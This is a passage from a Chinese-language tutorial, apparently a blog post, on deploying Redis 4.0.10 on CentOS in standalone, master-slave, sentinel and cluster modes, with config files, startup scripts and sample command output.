rh-ruby23 bash　　　　　# 临时变更当前环境变量的ruby版本为2.3（重启后失效） [info] 这种安装方式是使得ruby2.0和2.3版本并存，并非升级ruby。 之后若要再使用2.3版本的ruby，需再次执行scl enable rh-ruby23 bash命令。 查看ruby版本： ruby -v # ruby 2.3.6p384 (2017-12-14 revision 61254) [x86_64-linux] 安装gem： yum install rubygems -y 安装ruby的redis包（用于redis通讯）： gem install redis # 若前面安装ruby版本过低就会报错： # ERROR: Error installing redis: # redis requires Ruby version >= 2.2.2. 查看gem版本： gem -v 至此前置环境就安装完成了，下面开始讲述Redis四种模式的部署。 4. 单机模式 4.1. 简介 单机模式是Redis最基本的模式，之后的主从、哨兵、集群模式都是据此扩展而来。而且在开发环境下，出于方便起见，一般部署单机模式即可满足调试要求。 4.2. 安装 到官网下载最新版，本文下载的版本是redis-4.0.10.tar.gz ： 中文官网：http://www.redis.cn/ 英文官网（需翻墙）：https://redis.io/ 上传到Centos服务器，本文上传位置为： /usr/local/redis-4.0.10.tar.gz 解压安装包： tar -zxvf redis-4.0.10.tar.gz 由于Redis需要编译安装，先安装gcc编译环境： yum install gcc 进入Redis安装目录： cd /usr/local/redis-4.0.10/ 编译： make MALLOC=libc 编译完成后，进入src目录： cd /usr/local/redis-4.0.10/src/ 把 src 目录下的文件安装到 /usr/local/bin ： make install 4.3. 部署 默认情况下，Redis是通过以下方式启动/停止的： cd /usr/local/redis-4.0.10/src/　　# 切换到启动脚本目录 ./redis-server ../redis.conf　　　　# 启动Redis Ctrl + C　　　　　　　　　　　　　　　　# 停止Redis 这种启动方式非但无法在后台运行，而且也不符合使用习惯。 另外默认情况下Redis也不直接支持开机自启，为此要对其进行改造。 通过命令vi /usr/local/redis-4.0.10/redis.conf编辑Redis配置文件，为支持后台启动： daemonize yes　　　　　　# 后台启动模式 # 顺便修改一下其他配置项 maxmemory 536870912　　# 最大内存（单位byte），需根据实际配置，建议为当前空闲内存的50%左右 dir /tmp/redis　　　　　# Redis的工作目录（若不存在需手建否则无法启动），默认值为[./]，logfile与dbfilename受其影响 logfile \"6379.log\"　　　　# Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump.rdb　　# Redis数据持久化时的存储位置，正式部署请设置为合适的名称 [success] ● 单机模式配置redis.conf下载：https://share.weiyun.com/5ZhIKTe 密码：nppwyt ● 新建上面配置的Redis工作目录： mkdir /tmp/redis 然后在/etc目录下新建redis目录： mkdir /etc/redis 拷贝redis.conf配置文件到/etc/redis目录下，并重命名为6379.conf（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此若redis的端口号改了，这个文件名也要修改）： cp /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf 拷贝Redis的启动脚本到/etc/init.d目录下，并重命名为redisd： cp /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd 通过vi /etc/init.d/redisd命令修改redisd文件，在首行#!/bin/sh下面添加两行（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）： #!/bin/sh # chkconfig: 2345 90 10 # description: Redis is a persistent key-value database 切换到/etc/init.d目录： cd /etc/init.d 设置为开机自启： chkconfig redisd on　　　# 若不需要自启则执行 chkconfig redisd off 现在可以直接以服务的形式启动Redis了： service redisd start 4.4. 测试 然后通过Redis测试客户端命令redis-cli连接到Redis实例： cd /usr/local/redis-4.0.10/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6379 # 连接到Redis 172.168.10.63:6379> info # 查看Redis信息 # Server redis_version:4.0.10 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:a5e228e715215d35 redis_mode:standalone os:Linux 2.6.32-358.el6.x86_64 x86_64 arch_bits:64 multiplexing_api:epoll atomicvar_api:sync-builtin gcc_version:4.4.7 process_id:26027 run_id:d5f3dd33bb6b52f9b82927992251e21b3a68432e tcp_port:6379 uptime_in_seconds:1806685 uptime_in_days:20 hz:10 lru_clock:9988483 executable:/usr/local/bin/redis-server config_file:/etc/redis/6379.conf 至此Redis单机模式部署完成。 为了开始下一阶段部署，现在先停止这个Redis进程： service redisd stop 5. 主从模式 5.1. 简介 在实际生产环境下，Redis基本上是不可能部署成单机模式的。一般都需要部署Redis集群实现高可用，以保障业务的稳定运行。 要学会部署Redis集群，那就先从Redis集群中最简单的主从模式说起。 在一些简单小型的应用中，我们可能会看到类似于下图的Redis部署架构。其中Master是主机，Slave是从机，而这种架构方式就是所谓的一主多从： 在这种架构模式下，主机和从机的数据完全一致，主机支持数据的写入和读取等各项操作，而从机则只支持与主机数据的同步和读取。也就是说，客户端可以将数据写入到主机，由主机自动将数据的写入操作同步到从机。 主从模式很好的解决了数据备份问题，并且由于主从服务数据几乎是一致的，因而可以将写入数据的命令发送给主机执行，而读取数据的命令发送给不同的从机执行，从而达到读写分离的目的。 5.2. 部署 下面演示如何部署一个一主三从的主从模式。 为了区分单机模式的部署位置，这里拷贝一下Redis的目录： cp -r /usr/local/redis-4.0.10 /usr/local/redis-ms 下文会基于于/usr/local/redis-ms目录部署主从模式。 由于每个Redis实例都是一个单独的进程，所以需要在每个Redis实例启动时为其分配一个独立的配置文件就能使他们区分开来（同时由于本文是部署在同一台机器，需为每个实例指定不同的服务端口）。 为了在同一台机器上部署一主三从的Redis，准备以下四份配置文件： 角色 配置文件 服务端口 主机 redis-6379.conf 6379 从机 redis-6380.conf 6380 从机 redis-6381.conf 6381 从机 redis-6382.conf 6382 [info] 这四份配置文件均拷贝自 /usr/local/redis-ms/redis.conf ，拷贝到 /usr/local/redis-ms/ 目录再修改即可。 主机redis-6379.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 6379 daemonize yes pidfile /var/run/redis_6379.pid dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响 logfile \"6379.log\" # Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump-6379.rdb # Redis数据持久化时的存储位置，正式部署请设置为合适的名称 [success] ● 主从模式配置redis-6379.conf下载：https://share.weiyun.com/5JOX4Nd 密码：qdcfie ● 从机redis-6380.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 6380 daemonize yes pidfile /var/run/redis_6380.pid dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响 logfile \"6380.log\" # Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump-6380.rdb # Redis数据持久化时的存储位置，正式部署请设置为合适的名称 slaveof 127.0.0.1 6379 # 标注所从属的主机 [success] ● 主从模式配置redis-6380.conf下载：https://share.weiyun.com/5SCapFt 密码：4sibg2 ● 从机redis-6381.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 6381 daemonize yes pidfile /var/run/redis_6381.pid dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响 logfile \"6381.log\" # Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump-6381.rdb # Redis数据持久化时的存储位置，正式部署请设置为合适的名称 slaveof 127.0.0.1 6379 # 标注所从属的主机 [success] ● 主从模式配置redis-6381.conf下载：https://share.weiyun.com/5pZ7hup 密码：jiw8gm ● 从机redis-6382.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 6382 daemonize yes pidfile /var/run/redis_6382.pid dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响 logfile \"6382.log\" # Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump-6382.rdb # Redis数据持久化时的存储位置，正式部署请设置为合适的名称 slaveof 127.0.0.1 6379 # 标注所从属的主机 [success] ● 主从模式配置redis-6382.conf下载：https://share.weiyun.com/5rlib8O 密码：xf6qkn ● 新建上面配置的Redis工作目录： mkdir /tmp/redis-ms 然后使用redis-server命令启动Redis主从实例： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-server ../redis-6379.conf # 启动Redis主机，必须先启动 ./redis-server ../redis-6380.conf # 启动Redis从机 ./redis-server ../redis-6381.conf # 启动Redis从机 ./redis-server ../redis-6382.conf # 启动Redis从机 5.3. 测试 现在测试Redis主从模式是否能正常工作。 可先通过ps -ef|grep redis命令可查看四个主从进程是否正常启动： root 3919 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6379 root 3924 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6380 root 3930 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6381 root 3936 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6382 然后通过Redis测试客户端命令redis-cli分别连接到四台机器： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6379 # 连接到Redis主机 ./redis-cli -h 127.0.0.1 -p 6380 # 连接到Redis从机 ./redis-cli -h 127.0.0.1 -p 6381 # 连接到Redis从机 ./redis-cli -h 127.0.0.1 -p 6382 # 连接到Redis从机 分别在四个Redis测试客户端执行get命令，获取键名为site的数据： 127.0.0.1:6379> get site (nil) # 由于是新部署的Redis集群，该键值必定不存在 127.0.0.1:6380> get site (nil) # 由于是新部署的Redis集群，该键值必定不存在 127.0.0.1:6381> get site (nil) # 由于是新部署的Redis集群，该键值必定不存在 127.0.0.1:6382> get site (nil) # 由于是新部署的Redis集群，该键值必定不存在 现在在Redis主机6379的客户端写入数据（执行set命令，为键site设置数据）： 127.0.0.1:6379> set site http://exp-blog.com 再在三台Redis从机 6380 ~ 6382 的客户端读取数据（执行get命令，获取键名为site的数据）。由于经过主从数据同步，此时三台从机都能取到值： 127.0.0.1:6380> get site \"http://exp-blog.com\" 127.0.0.1:6381> get site \"http://exp-blog.com\" 127.0.0.1:6382> get site \"http://exp-blog.com\" 至此Redis主从模式部署完成。 下一阶段哨兵模式的部署是基于主从模式的，可以暂且不用停止Redis进程。 6. 哨兵模式 6.1. 简介 前面所配置的主从模式，虽然实现了读写分离，解决了数据备份问题和单机模式可能存在的性能问题，但是也引入了新的问题： 由于主从模式下可以将读写操作分配给不同的Redis节点，从而达到提高系统吞吐量的目的，但也正是因为这种方式造成了使用上的不便。因为客户端连接到不同的Redis节点时，都需要指定特定的IP端口，若所连接的节点因为故障下线了，主从模式便无法通知客户端切换到另一个可用节点，只能靠手动更改客户端配置并重连。 尤其是如果故障下线的是主节点，那么所有的从节点便会因为没有主节点而同步中断，整个集群会陷入瘫痪（严格来说是所有从节点变成独立节点，再无关联性），直至人工重新指定新的主节点。 为了解决上面的问题，Redis在2.8版本后开始支持哨兵模式，其架构模式如下图： Redis的Sentinel系统（即哨兵系统）可用于管理多组Redis主从实例，它是Redis的高可用性解决方案。这个系统主要执行以下三个任务： 监控（Monitoring）：Sentinel会不断地定期检查主/从节点服务器是否运作正常 提醒（Notification）：当被监控的某个节点服务器出现问题时，Sentinel可以通过API向管理员或者其他应用程序发送通知 自动故障迁移（Automaticfailover）：当一个主节点不能正常工作时，Sentinel会开始一次自动故障迁移操作，它会将失效主节点下的其中一个从节点升级为新的主节点，并让失效主主节点的其他从节点改为复制新的主节点。当Redis客户端试图连接失效的主节点时，集群也会向客户端返回新主节点的地址，使得集群可以使用新主节点代替失效主节点。 6.2. 部署 下面演示如何在上一阶段的主从模式基础上，增加部署一套哨兵系统。 先准备好三份配置文件： 角色 配置文件 监听端口 哨兵 sentinel-26380.conf 26380 哨兵 sentinel-26381.conf 26381 哨兵 sentinel-26382.conf 26382 [info] ① 这三份配置文件均拷贝自/usr/local/redis-ms/sentinel.conf，拷贝到 /usr/local/redis-ms/目录再修改即可。 ② 建议哨兵至少部署3个，并且哨兵节点数量要满足2n+1（n>=1），即奇数个。 哨兵sentinel-26380.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 26380 daemonize yes # 后台启动模式（若无配置项则添加） dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响 logfile \"sentinel-26380.log\" # 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称 sentinel monitor exp-blog.com 127.0.0.1 6379 2 # 标注所监视的主机（其下的从机会被自动拉取，无需配置） sentinel down-after-milliseconds exp-blog.com 30000 sentinel parallel-syncs exp-blog.com 1 sentinel failover-timeout exp-blog.com 180000 [success] ● 哨兵模式配置sentinel-26380.conf下载：https://share.weiyun.com/52UsmNu 密码：fyrtmn ● 哨兵sentinel-26381.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 26381 daemonize yes # 后台启动模式（若无配置项则添加） dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响 logfile \"sentinel-26381.log\" # 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称 sentinel monitor exp-blog.com 127.0.0.1 6379 2 # 标注所监视的主机（其下的从机会被自动拉取，无需配置） sentinel down-after-milliseconds exp-blog.com 30000 sentinel parallel-syncs exp-blog.com 1 sentinel failover-timeout exp-blog.com 180000 [success] ● 哨兵模式配置sentinel-26381.conf下载：https://share.weiyun.com/5muO7vd 密码：8i72bw ● 哨兵sentinel-26382.conf配置文件内容如下： bind 127.0.0.1 # 正式部署请设为合适的IP port 26382 daemonize yes # 后台启动模式（若无配置项则添加） dir /tmp/redis-ms # Redis的工作目录（若不存在需手建否则无法启动），logfile受其影响 logfile \"sentinel-26382.log\" # 哨兵日志名称（若无配置项则添加），正式部署请设置为合适的名称 sentinel monitor exp-blog.com 127.0.0.1 6379 2 # 标注所监视的主机（其下的从机会被自动拉取，无需配置） sentinel down-after-milliseconds exp-blog.com 30000 sentinel parallel-syncs exp-blog.com 1 sentinel failover-timeout exp-blog.com 180000 [success] ● 哨兵模式配置sentinel-26382.conf下载：https://share.weiyun.com/5g6NMkM 密码：db6ugw ● 针对上面几个sentinel-xxxxx.conf配置中的几个关键配置项说明如下： sentinel monitor exp-blog.com 127.0.0.1 6379 2 　　监控的主节点的名字为exp-blog.com（这个名字任意的，有效字符为[A-Z] [a-z] [0-9] [._-]） 　　监控的主节点服务地址127.0.0.1:6379 　　行尾最后的2表示当集群中有2个以上sentinel认为主节点下线时，才认为其客观下线 sentinel down-after-milliseconds exp-blog.com 30000 　　主节点在30000 ms内无反应，哨兵会开始使用“选举机制”进行主从切换 sentinel parallel-syncs exp-blog.com 1 　　在因主节点失效而发生故障转移（即主从切换）时，最多可以有多少个从节点同时对新的主节点进行并发同步。 　　这个数字越小，完成故障转移所需的时间就越长（余下的从节点需要排队等待同步）； 　　但这个数字越大，就意味着越多的从节点因为正在对新的主节点进行同步而不可用。 　　当从节点只用于查询服务时，可将此值设为1确保最多只有一个从节点因同步而不可用。 sentinel failover-timeout exp-blog.com 180000 　　如果在该180000 ms内未能完成故障转移，则认这次故障转移超时失败。 　　不过即使超时，从节点也会正确指向新主节点，但不会按照parallel-syncs规则进行同步 接下来就可以启动Redis主从服务和Sentinel系统了。 启动顺序必须严格按照： Redis Master（主节点） -> Redis Slave（从节点） -> Redis Sentinel（哨兵节点） 主从服务的启动在上一阶段已经做过了，此处就不重述了。 Sentinel系统需要使用redis-sentinel命令启动： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-sentinel ../sentinel-26380.conf # 启动Redis哨兵节点 ./redis-sentinel ../sentinel-26381.conf # 启动Redis哨兵节点 ./redis-sentinel ../sentinel-26382.conf # 启动Redis哨兵节点 6.3. 测试 现在测试Sentinel系统是否能正常工作。 可先通过ps -ef|grep redis命令可查看四个主从进程和三个监控进程是否正常启动： root 3919 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6379 root 3924 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6380 root 3930 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6381 root 3936 1 0 22:08 ? 00:00:02 ./redis-server 127.0.0.1:6382 root 4342 1 0 22:37 ? 00:00:00 ./redis-sentinel 127.0.0.1:26380 [sentinel] root 4347 1 0 22:37 ? 00:00:00 ./redis-sentinel 127.0.0.1:26381 [sentinel] root 4383 1 0 22:38 ? 00:00:00 ./redis-sentinel 127.0.0.1:26382 [sentinel] 然后通过Redis测试客户端命令redis-cli连接到任意一台Sentinel机器查看监控信息（实际生产环境中，一般是不需要连接Sentinel机器的）： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 26380 # 连接到哨兵机26380 127.0.0.1:26380> info sentinel # 查看监控信息 ./redis-cli -h 127.0.0.1 -p 26381 # 连接到哨兵机26381 127.0.0.1:26381> info sentinel # 查看监控信息 ./redis-cli -h 127.0.0.1 -p 26382 # 连接到哨兵机26382 127.0.0.1:26382> info sentinel # 查看监控信息 # 三台哨兵的返回信息是一致的： sentinel_masters:1 # 监控主机1台 sentinel_tilt:0 sentinel_running_scripts:0 sentinel_scripts_queue_length:0 sentinel_simulate_failure_flags:0 # 0号主机名称为exp-blog.com，地址为127.0.0.1:6379，共有三台从机，三台哨兵机 master0:name=exp-blog.com,status=ok,address=127.0.0.1:6379,slaves=3,sentinels=3 现在尝试终止Redis主机进程（6379端口节点）来模拟主机下线： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6379 # 连接到Redis主机 127.0.0.1:6379> shutdown # 终止Redis服务 然后连接到任意一台哨兵机，查看当前的监控信息： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 26380 # 连接到哨兵机26380 127.0.0.1:26380> info sentinel # 查看监控信息 # 返回监控信息 sentinel_masters:1 sentinel_tilt:0 sentinel_running_scripts:0 sentinel_scripts_queue_length:0 sentinel_simulate_failure_flags:0 master0:name=exp-blog.com,status=ok,address=127.0.0.1:6382,slaves=3,sentinels=3 # 主机地址发生变化了 不难发现主机变成了127.0.0.1:6382，登陆这台主机查看主从信息： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6382 # 连接到Redis主机 127.0.0.1:6382> info replication # 查看主从信息 # 返回主从信息 role:master connected_slaves:2 # 这台主机下有2台从机 slave0:ip=127.0.0.1,port=6381,state=online,offset=254791,lag=1 # 0号从机是 127.0.0.1:6381 slave1:ip=127.0.0.1,port=6380,state=online,offset=254791,lag=1 # 1号从机是 127.0.0.1:6380 由此可知，当原主机6379下线后，原从机6382被哨兵系统提升为新的主机，而其他的两台从机6380和6381变成新主机6382的从机。此时集群系统变成一主两从。 现在重新启动6379机器： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-server ../redis-6379.conf # 启动Redis机器 再登陆新主机127.0.0.1:6382查看主从信息： cd /usr/local/redis-ms/src/ # 切换到启动脚本目录 ./redis-cli -h 127.0.0.1 -p 6382 # 连接到Redis主机 127.0.0.1:6382> info replication # 查看主从信息 # 返回主从信息 role:master connected_slaves:3 # 这台主机下变成有3台从机 slave0:ip=127.0.0.1,port=6381,state=online,offset=254791,lag=1 # 0号从机是 127.0.0.1:6381 slave1:ip=127.0.0.1,port=6380,state=online,offset=254791,lag=1 # 1号从机是 127.0.0.1:6380 slave2:ip=127.0.0.1,port=6379,state=online,offset=365581,lag=1 # 新挂接的2号从机是 127.0.0.1:6379 由此可知，当6379机器重新上线后，并不会恢复原主机的身份，而是被哨兵系统挂接到新主机6382下，成为其从机。此时集群系统重新变成一主三从。 **至此Redis哨兵模式部署完成。** 为了开始下一阶段部署，现在先停止前面部署的所有Redis进程： pkill redis 6.4. 附：哨兵模式一键启动/停止/重启脚本 [success] ● 脚本下载：https://share.weiyun.com/5hLLA40 密码：qiwc5g ● 此脚本是根据上文的部署方式和位置编写的，仅适用于Redis节点均在同一台机器的场景。 若要移植到其他地方使用，需要根据实际情况修改。 脚本内容如下： #!/bin/bash # 根据主从/哨兵模式的部署目录对应修改 cd /usr/local/redis-ms/src/ # 启动函数 start() { ./redis-server ../redis-6379.conf & ./redis-server ../redis-6380.conf & ./redis-server ../redis-6381.conf & ./redis-server ../redis-6382.conf & ./redis-sentinel ../sentinel-26380.conf & ./redis-sentinel ../sentinel-26381.conf & ./redis-sentinel ../sentinel-26382.conf & echo \"all running\" } # 停止函数 stop() { ps -ef | grep \"redis\" | grep -v \"grep\" |awk '{print $2}'| while read pid do C_PID=$(ps --no-heading $pid | wc -l) if [[ $C_PID == \"1\" ]]; then kill -9 $pid echo \"PID=$pid is dead\" else echo \"PID=$pid not exists\" fi done echo \"all dead\" } # 脚本入口参数 start|stop|restart case \"$1\" in start) start ;; stop) stop ;; restart) stop start ;; *) printf 'Usage: %s {start|stop|restart}\\n'\"$prog\" exit 1 ;; esac 这是shell脚本，保存为redis-mss.sh（文件名任意）即可执行（若无法执行可能是换行符非Linux格式的问题，可尝试通过dos2unix命令修正换行符）。 使用方式如下： sh redis-mss.sh start # 启动 sh redis-mss.sh stop # 停止 sh redis-mss.sh restart # 重启 7. 集群模式 7.1. 简介 Redis在3.0版本后开始支持集群模式（Redis Cluster），目前官方一直都在维护中，具有代表性，建议优先使用。 Redis Cluster是一种服务器Sharding技术，只要将查询请求发送到Redis Cluster中的任意节点，接收到请求的节点会就将查询请求发送到正确的节点上执行： 当Redis客户端操作的key恰好在所查询的Redis节点上时，就像操作Redis单例一样。 当客户端操作的key没有分配到所查询的Redis节点上时，Redis会返回转向指令，指向正确的Redis节点，这类似于浏览器页面的302 重定向跳转。 Redis Cluster并没有使用一致性Hash，而是采用slot（槽）的概念，一共分成16384个槽。Redis Cluster要保证16384个槽对应的Redis节点都正常工作，否则一旦某个Redis节点发生故障，那它负责的slots也就失效，整个集群将不能工作。 为了增加集群的高可用性，官方推荐的方案是将Redis节点配置成主从结构，即一个主节点，挂N个从节点。这时，如果主节点失效，Redis Cluster会根据选举算法在从节点中选择一个上升为主节点，整个集群继续对外提供服务。 Redis Cluster的架构模式如下图： 上图描述的是六个redis实例构成的集群（三主三从），其中： 6379端口为客户端通讯端口 16379端口为集群总线端口 集群内部划分为16384个数据分槽，分布在三个主节点中 从节点没有分槽，不会参与集群投票，也不会提供数据读取服务，仅作为主节点的备份 三个主节点中平均分布着16384数据分槽的三分之一，每个节点中不会存在重复数据，仅仅使用自己的从机帮忙冗余 Redis Cluster具有以下优点： 无中心架构，支持动态扩容，对业务透明 具备Sentinel的监控和自动故障迁移能力 高性能，客户端直连Redis服务，免去了Proxy代理的损耗 客户端不需要连接集群所有节点，连接集群中任何一个可用节点即可（实际上是必须连接整个集群的，避免单点故障导致客户端不可用） Redis Cluster同时也具有以下缺点： 部署和运维复杂 数据迁移需要人工干预 只能使用0号数据库 不支持批量操作 分布式逻辑和存储模块耦合 7.2. 部署 下面演示如何部署集群模式。 官方推荐Redis Cluster至少需要六个节点，即三主三从。 这里准备六个Redis节点，同时为了区分主从/哨兵模式的部署位置，顺便拷贝一下Redis集群节点的目录（以节点端口号区分）： mkdir /usr/local/redis-cluster # 创建Redis集群目录 cp /usr/local/redis-4.0.10/src/redis-trib.rb /usr/local/redis-cluster/ # 集群构建脚本 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6390 # Redis集群节点目录 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6391 # Redis集群节点目录 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6392 # Redis集群节点目录 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6393 # Redis集群节点目录 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6394 # Redis集群节点目录 cp -r /usr/local/redis-4.0.10 /usr/local/redis-cluster/redis-6395 # Redis集群节点目录 下文会基于/usr/local/redis-cluster/redis-xxxx目录部署集群模式。 然后配置这六个Redis节点的配置文件，其配置基本相同（主从无需配置，在后面初次构建集群时会自动分配；尔后若添加新节点，可人工指定是主节点还是从节点）： 角色 配置文件 服务端口 集群节点 /usr/local/redis-cluster/redis-6390/redis.conf 6390 集群节点 /usr/local/redis-cluster/redis-6391/redis.conf 6391 集群节点 /usr/local/redis-cluster/redis-6392/redis.conf 6392 集群节点 /usr/local/redis-cluster/redis-6393/redis.conf 6393 集群节点 /usr/local/redis-cluster/redis-6394/redis.conf 6394 集群节点 /usr/local/redis-cluster/redis-6395/redis.conf 6395 配置文件/usr/local/redis-cluster/redis-639x/redis.conf的内容如下（仅端口号不同）： bind 127.0.0.1 # 正式部署请设为合适的IP port 639x daemonize yes pidfile /var/run/redis_639x.pid dir /tmp/redis-cluster # Redis的工作目录（若不存在需手建否则无法启动），logfile与dbfilename受其影响 logfile \"639x.log\" # Redis日志名称（默认不配置，表示输出到stdout），正式部署请设置为合适的名称 dbfilename dump-639x.rdb # Redis数据持久化时的存储位置，正式部署请设置为合适的名称 cluster-enabled yes # 启用集群模式 cluster-config-file nodes-639x.conf # 集群节点的配置文件，由集群创建，但若同一台主机上的名称需唯一 cluster-node-timeout 15000 [success] ● 集群模式配置redis-639x.conf下载：链接：https://share.weiyun.com/5YJ5V6S 密码：2fha9v ● 新建上面配置的Redis集群工作目录： mkdir /tmp/redis-cluster 然后使用redis-server命令启动六个Redis节点： cd /usr/local/redis-cluster/redis-6390/src/ # 切换到Redis-6390节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 cd /usr/local/redis-cluster/redis-6391/src/ # 切换到Redis-6391节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 cd /usr/local/redis-cluster/redis-6392/src/ # 切换到Redis-6392节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 cd /usr/local/redis-cluster/redis-6393/src/ # 切换到Redis-6393节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 cd /usr/local/redis-cluster/redis-6394/src/ # 切换到Redis-6394节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 cd /usr/local/redis-cluster/redis-6395/src/ # 切换到Redis-6395节点的启动脚本目录 ./redis-server ../redis.conf # 启动Redis节点 先通过ps -ef|grep redis命令可查看六个节点进程是否正常启动： root 20305 1 0 01:41 ? 00:00:00 ./redis-server 127.0.0.1:6390 [cluster] root 20320 1 0 01:43 ? 00:00:00 ./redis-server 127.0.0.1:6391 [cluster] root 20325 1 0 01:43 ? 00:00:00 ./redis-server 127.0.0.1:6392 [cluster] root 20330 1 0 01:43 ? 00:00:00 ./redis-server 127.0.0.1:6393 [cluster] root 20335 1 0 01:43 ? 00:00:00 ./redis-server 127.0.0.1:6394 [cluster] root 20340 1 0 01:43 ? 00:00:00 ./redis-server 127.0.0.1:6395 [cluster] 然后使用Redis官方提供的工具redis-trib.rb（注意：这个是ruby脚本，需要安装相关支持库，否则无法运行）把这6个节点组建成集群（注意：若集群节点分布在多台不同的机器上，只需其中一个机器执行这条命令即可，但要包含所有机器的集群节点）： cd /usr/local/redis-cluster/ # 切换到集群构建脚本目录 ./redis-trib.rb create --replicas 1 127.0.0.1:6390 127.0.0.1:6391 127.0.0.1:6392 127.0.0.1:6393 127.0.0.1:6394 127.0.0.1:6395 [info] 若以后机器IP发生变更，需要重新执行此命令重建集群（重建集群需要先停止集群中所有节点进程，然后删除原集群中所有节点的node.conf文件，最后按照上文步骤构建集群即可）。 此时Redis会返回正在构建的集群信息，返回的信息大概意思是“正在把slots槽位分配到6个节点的集群，其中6390、6391、6392是主节点，6394是6390的从节点，6395是6391的从节点，6393是6392的从节点”。 这里的主从分配是自动的，若确认无误则输入yes： >>> Creating cluster >>> Performing hash slots allocation on 6 nodes... Using 3 masters:　　　　　# 三主 127.0.0.1:6390 127.0.0.1:6391 127.0.0.1:6392 Adding replica 127.0.0.1:6394 to 127.0.0.1:6390　　　　# 三从 Adding replica 127.0.0.1:6395 to 127.0.0.1:6391 Adding replica 127.0.0.1:6393 to 127.0.0.1:6392 >>> Trying to optimize slaves allocation for anti-affinity [WARNING] Some slaves are in the same host as their master M: ac2520bab97d151897afb5e6f3ca60a673010227 127.0.0.1:6390 slots:0-5460 (5461 slots) master M: 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 127.0.0.1:6391 slots:5461-10922 (5462 slots) master M: ac19a87740dc0f0559f10cd1eae617cfcd51b04a 127.0.0.1:6392 slots:10923-16383 (5461 slots) master S: d93d05facb7db5c223d0959a0e58d232334057e4 127.0.0.1:6393 replicates 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 S: 69546e0a773b6548a37c5d55329eac575c5d7cca 127.0.0.1:6394 replicates ac19a87740dc0f0559f10cd1eae617cfcd51b04a S: ab7405fc14dbc4e883644bccc6d8602992780b44 127.0.0.1:6395 replicates ac2520bab97d151897afb5e6f3ca60a673010227 Can I set the above configuration? (type \"yes\" to accept): yes　　　　# 若确认无误则输入yes 若构建集群成功，则会返回集群内这6个节点的信息： >>> Nodes configuration updated >>> Assign a different config epoch to each node >>> Sending CLUSTER MEET messages to join the cluster Waiting for the cluster to join.... >>> Performing Cluster Check (using node 127.0.0.1:6390) M: ac2520bab97d151897afb5e6f3ca60a673010227 127.0.0.1:6390 slots:0-5460 (5461 slots) master 1 additional replica(s) M: 3768ff79e3e58a0ee9c1fef1ab04e7e395196fa8 127.0.0.1:6391 slots:5461-10922 (5462 slots) master 1 additional replica(s) S: 69546e0a773b6548a37c5d55329eac575c5d7cca 127.0.0.1:6394 slots: (0 slots) slave replicates ac19a87740dc0f0559f10cd1eae617cfcd51b04a M: ac19a87740dc0f0559f10cd1eae617cfcd51b04a 127.0.0.1:6392 slots:10923-16383 (5461 slots) master 1 additional replica(s) S: ab7405fc14dbc4e883644bccc6d8602992780b44 127.0.0.1:6395 slots: (0 slots) slave replicates ac2520bab97d151897afb5e6f3ca60a673010227 S: 